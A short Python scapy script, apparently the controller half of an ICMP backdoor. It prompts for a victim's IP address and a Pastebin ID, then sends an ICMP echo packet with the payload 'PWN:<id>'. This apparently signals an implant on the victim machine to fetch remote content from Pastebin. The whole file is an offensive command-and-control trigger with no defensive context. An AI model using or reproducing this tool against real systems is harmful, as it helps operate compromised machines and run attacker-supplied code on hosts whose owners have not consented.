from scapy.all import *


victim_ip = input("Enter the victim's IP address: ").strip()

id = input("Enter the Pastebin ID: ").strip()

packet = IP(dst=victim_ip)/ICMP(type=8)/Raw(f"PWN:{id}")

packet.show()

send(packet)

print("Packet sent!")
